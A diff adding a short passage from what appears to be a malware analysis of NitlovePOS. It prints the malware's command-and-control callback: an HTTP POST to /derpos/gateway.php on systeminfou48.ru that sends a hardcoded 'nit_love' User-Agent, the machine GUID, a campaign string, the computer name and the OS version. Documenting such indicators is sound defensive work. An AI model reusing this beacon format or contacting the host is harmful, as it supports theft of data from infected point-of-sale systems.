@@ -1,0 +1,9 @@
+
+This IP address is assigned to a network located in St. Petersburg, Russia.
+As soon as NitlovePOS starts running on the compromised system, it will initiate a callback via SSL: POST /derpos/gateway.php HTTP/1.1 User-Agent: nit_love<GUID>
+Host: systeminfou48.ru
+Content-Length: 41 Connection: Keep-Alive Cache-Control: no-cache Pragma: no-cache F.r.
+HWAWAWAWA <computer name> <
+OS Version> Y
+The User-Agent header contains a hardcoded string “nit_love” and the Machine GUID, which is not necessarily unique but can be used as an identifier by the cybercriminals.
+The string “HWAWAWAWA” is hardcoded and may be a unique campaign identifier; the “F.r.” is calculated per infected host.
